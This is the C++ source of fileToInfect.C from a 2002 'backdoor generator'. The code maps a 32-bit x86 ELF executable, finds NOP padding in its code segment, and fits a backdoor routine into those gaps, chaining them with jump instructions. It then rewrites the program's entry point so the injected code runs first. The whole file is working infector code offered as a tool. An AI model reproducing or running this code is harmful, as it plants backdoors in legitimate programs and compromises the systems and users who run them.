/* fileToInfect.C   this wrapper the file to infect
 *
 * Gildo backdoor generator is copyright (C) 2002 Mauro Meneghin.
 * All rights reserved. The software is redistributable under
 * the licence given in the file "Licence" distributed in the
 * Gbkdoor archive.
 */



#include "fileToInfect.h"
#include "pool.h"
#include "chunk.h"
#include "define.h"
#include "permutation.h"
#include "list.h"
#include "list/list1.h"
#include "list/list2.h"

#include "instructionSet.h"

//stat
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

//open
#include <fcntl.h>

//mmap
#include <sys/mman.h>

//dump routines 
#include <stdio.h>
#include <string.h>
#include <errno.h>

//realloc
#include <stdlib.h>

FileToInfect::FileToInfect(const char* name=NULL) :
	m_name(name), m_bIsValidELF(false), m_fd(-1), m_map(NULL),
	m_nChunks(0), m_NOPChunk(NULL)
{
  unsigned char *mapRaw;
  int ret_stat=-1;
  m_bErrorFound=true;

  if((m_fd=open(name, O_RDWR))==-1 ||
    (ret_stat=stat(name, &m_stat))==-1 ||
    (mapRaw=(unsigned char*)mmap(NULL,m_stat.st_size, PROT_READ | PROT_WRITE, 
                                MAP_SHARED, m_fd, 0))==(void*)-1)
  {
    if(ret_stat!=-1 && !S_ISREG(m_stat.st_mode))
    {
      fprintf(stderr, "error, the file %s is not a regular file\n", name);
      exit(2); ///ERR
    }
    fprintf(stderr, "error looking for file %s: %s\n",
            name, strerror(errno));
    exit(2);  //ERRR
  }
  m_size=m_stat.st_size;
  if((m_map=new Pool(m_size, mapRaw))!=NULL);
    m_bErrorFound=false;

  //all right if arrived here
}





int FileToInfect::Analize()
{
  unsigned char *p1;		//pointer to scan memory for NOPs
  unsigned int size,		//how many NOPs in a chunk
               execAddr,	//the address during file 
                        	//execution(!=now mapped in memory)
               offBeginText,	//offset where text(executable in phdr)begin
               offEndText;	//offset where text ends
  int i1;			//index of text phdr
  unsigned int u1;		//another temporary value, offset to scan mem

  if(m_bErrorFound==true) return 3; //ERR_GENERIC
  m_bErrorFound=true;
  
  //verify if is a correct ELF
  m_ehdr=(Elf32_Ehdr*)((*m_map)+0);
  if(m_size<sizeof(Elf32_Ehdr)+sizeof(Elf32_Phdr))   
                          return 2; //ERR_SIZE
  else if(!((*m_map)[0]==0x7f && (*m_map)[1]=='E' && (*m_map)[2]=='L' && 
          (*m_map)[3]=='F')) 
                          return 2; //ERR_FILEFORMAT
  else if(m_ehdr->e_type!=ET_EXEC) 
                          return 3; //ERR_NOTEXECUTABLE
  else if(m_ehdr->e_machine!=EM_386) 
                          return 4; //ERR_INVALIDARCHITECTURE 
    
  else if(m_size<m_ehdr->e_phoff+m_ehdr->e_phnum*m_ehdr->e_phentsize ||
          m_size<m_ehdr->e_shoff+m_ehdr->e_shnum*m_ehdr->e_shentsize)
                          return 2; //ERR_SIZE
  m_phdr=(Elf32_Phdr*)((*m_map)+m_ehdr->e_phoff);
  m_shdr=(Elf32_Shdr*)((*m_map)+m_ehdr->e_shoff);
  m_bIsValidELF=true;
  m_bErrorFound=false;
  
  //look for NOP chunks

  //find begin and end of text where to look (right segment)
  offEndText=m_size;	//just in case no section exist (a fake executable)
  for(i1=0;i1<m_ehdr->e_phnum;i1++)
  {
#ifdef DEBUG
    printf("inside %i\ttype=%u\tflag=%u\n",i1,m_phdr[i1].p_type,m_phdr[i1].p_flags);
#endif
    if(m_phdr[i1].p_type==PT_LOAD &&
       m_phdr[i1].p_flags==(PF_X | PF_R))
    {
#ifdef DEBUG
      printf("the text section is %i-th\n", i1);  /////////////////
#endif
      offBeginText=m_phdr[i1].p_offset;
      offEndText=offBeginText+m_phdr[i1].p_filesz;
      break;
    }
  }
  (*m_map)[offEndText];	//this give an assertion if outside the file
                    	//or if not exist that segment
  unsigned char c ;
  c=(*m_map)[2]; 
  size=0; 
  m_nChunks=0;		//to be sure
  printf("looking for not used space inside the executable:\n");
  for(u1=offBeginText;u1<offEndText;u1++,size++)
  {
    if((*m_map)[u1] != IS.NOP.RetOp(0) /*0x90*/) 
    {
      //NOTE: there is a big chunk of NOPs after 'call exit', so there isn't 'leave ret' there
      if(size>=CHNK_MINSIZE+1 )
      { 
        //for little chunks look if there is leave ret before nop
        if(size>7 || ((*m_map)[u1-size]==IS.RET.RetOp(0) /*0xc3*/ && 
                     (*m_map)[u1-size-1]==IS.LEAVE.RetOp(0) /*0xc9*/)) 
        {
          printf("\tchunk%i offset=%p\tsize=%dbytes\n",m_nChunks,u1-size+1,size-1); //////////////////////
          //realloc m_NOPChunk to be bigger first
          m_NOPChunk=(Chunk**)realloc(m_NOPChunk, (m_nChunks+1)*sizeof(Chunk*));
          m_NOPChunk[m_nChunks]=new Chunk(size-1, (*m_map)+u1-size+1,
                                        m_phdr[i1].p_vaddr+u1-size+1);
          m_nChunks++;
        }
      }
      size=0;
    }
  }
  return(0);
}



/* try to see if there is enought space for the backdoor type infection
 * and how is possible to do that, for example infection=1 means to try 
 * to insert List1 backdoor, and so on
 */
int FileToInfect::ChooseBetterInfection(unsigned int infection)
{
  int i,j;
  unsigned int space,
               required;
  Chunk **ChPerm;  //permutated chunks
  Permutation p;
  List *ls;
  bool bFound=false;   //true when a permutation that fit is been found
  unsigned char *offset;     //is the jump offset
  if(m_bErrorFound==true) return 3; //ERR_GENERIC
  while(m_nChunks>MAX_NUM_OF_ELEMENTS) //find the most large ones, delete 
                                       //littler so don't use too many resources
  {
    //remove littler and swich down
    unsigned int minsize=(unsigned int)-1,
                minwhich=0;
    for(i=0;i<m_nChunks;i++)
    {
      if(m_NOPChunk[i]->GetSize()<minsize)
      {
        minwhich=i;
        minsize=m_NOPChunk[i]->GetSize();
      }
    }
    //swap
    delete m_NOPChunk[minwhich];
    for(i=minwhich;i<m_nChunks;i++)
      m_NOPChunk[i]=m_NOPChunk[i+1];
    m_nChunks--;    
  }
  //assign the right listing
  switch(infection)
  {
  case 1:
    ls=new List1();  //adj jmp to old entry point later
    break;
  case 2:
    ls=new List2();  //adj jmp to old entry point later
    break;
  default:
    return 2; //ERR_
  }
  printf("now I look the better usage of %u chunks considered for "
         "backdoor list%d\n",m_nChunks,infection); ////////////////////
  //if sum of chunks GetSize() < listing size then nothing to do
  space=0;
  for(i=0;i<m_nChunks;i++)
    space+=m_NOPChunk[i]->GetSize();
  if(ls->GetSize()>space)
    return 3; //ERR_SPACE
  printf("mhm, listing space need %ubytes more the linking jumps\n",ls->GetSize());
  printf("total space available=%ubytes\n",space);

  if((ChPerm=(Chunk **)malloc(m_nChunks*sizeof(Chunk*)))==NULL) return 2; //ERR_ALLOC
  if(p.initpermutation(m_nChunks)!=0)
    return 2; //ERR_PERMUT;
  printf("now I'll look for the best order in which to connect the chunks\n");
  do
  {
    p.assign(m_NOPChunk,ChPerm);
//    p.Dump();
    //adjust useful space of chunks, remember that chunks considered are nChunks
    for(i=0;i+1<m_nChunks;i++)
    {
      int distance=ChPerm[i+1]->GetExecAddr() - (ChPerm[i]->GetExecAddr()+ChPerm[i]->GetSize()); 
#ifdef DEBUG
      printf("distance between ChPerm[%i] and ChPerm[%i] is %p\n",i,i+1,distance); ///////////////////////////
#endif
      if(distance>=-128 && distance<=127)  //the link jmp will require 2 bytes
      {
        ChPerm[i]->SetUseful(ChPerm[i]->GetSize()-2);
        offset=(unsigned char*)malloc(2);
        offset[1]=(unsigned char)distance;
        ChPerm[i]->LinkJmp(IS.JMP_BYTE,offset);
      }
      else   //the link jmp will require 5 bytes
      {
        ChPerm[i]->SetUseful(ChPerm[i]->GetSize()-5);
        offset=(unsigned char*)malloc(5);
        *(unsigned int*)&offset[1]=distance;
        ChPerm[i]->LinkJmp(IS.JMP_DWORD,offset);
      }
#ifdef DEBUG
      printf("-chunk[%i] usefulspace=%u\n",i,ChPerm[i]->GetUseful()); ///////////////////
      printf("distance is %u\n",distance);
#endif
//      free(offset);   
    }
    ChPerm[i]->SetUseful(ChPerm[i]->GetSize());  //no jump in last chunk

    //try to see if size fit, only here I look into the listing 
    space=required=i=j=0;
    while(i<ls->GetOPCount() && j<m_nChunks)
    {
      if(space==0)
        space=ChPerm[j++]->GetUseful();
      if(required==0)
        required=(*ls)[i++].GetSize();
      if(space>=required) 
      {
#ifdef DEBUG
        printf("chunk[%i]:space=%u\nlist1[%i]:required=%u\n",j-1,space,i-1,required);
#endif
        space-=required;
        required=0;
        if(i==ls->GetOPCount())
          bFound=true;
      }else
        space=0;  //no worth space
    }
  }while(bFound==false && p.nextpermutation()==0);
  
  //if bFound=true then ok, can infect with this permutation
  if(bFound==true)
  {
    printf("allright, I can infect with permutation:\n\t");
    p.Dump();
#ifdef DEBUG
    ls->Dump();
#endif
      //infect the file in this way
      int which;
      printf("infecting...\n");
      //add opcodes to the chunks 
      space=required=i=j=0;
      while(i<ls->GetOPCount() && j<m_nChunks)
      {
        if(space==0)
        {
          which=0;
          space=ChPerm[j++]->GetUseful();
        }
        if(required==0)
          required=(*ls)[i++].GetSize();
        if(space>=required) 
        {
          space-=required;
          required=0;
          ChPerm[j-1]->WriteOpCodeAt(which++,(*ls)[i-1]);
          if(ls->AdjustEntry(i-1,m_ehdr->e_entry,ChPerm[j-1]->GetExecAddr()+
             ChPerm[j-1]->GetCurrentSize())==0)
             ChPerm[j-1]->WriteOpCodeAt(which-1,(*ls)[i-1]);  //set oldentry
        }else
          space=0;  //no worth space
      }
      //write down to memory
      for(i=0;i<m_nChunks;i++)
      {
#ifdef DEBUG
        printf("writing chunk %i\n",i);
#endif
        if(ChPerm[i]->WriteInMemory()!=0)
        {
          printf("error writing\n");
          exit(1);
        }
      }
      //change entry point
      Elf32_Ehdr *ehdr=(Elf32_Ehdr*)((*m_map)+0);
      printf("changing entry point:\n\toldentry=%p\n\tnewentry=%p\n",
             ehdr->e_entry,ChPerm[0]->GetExecAddr());
      ehdr->e_entry=ChPerm[0]->GetExecAddr();
      p.endpermutation();
      free(ChPerm);
      ls->DumpHelp(m_name);
      printf("WORK DONE!\n");
      return 0; //successful infected
  }
  
  printf("\nsorry, the file is not suitable for this kind of infection\n");
  p.endpermutation();
  free(ChPerm);
  return(1); //err_not wanted
}


FileToInfect::~FileToInfect()
{
  if((*m_map)+0!=(void*)-1) munmap((*m_map)+0, m_size);
  if(m_fd!=-1) close(m_fd);
  if(m_map!=NULL) delete m_map;
  while(m_nChunks>0)
    delete m_NOPChunk[--m_nChunks];
  if(m_NOPChunk) delete[] m_NOPChunk;
}



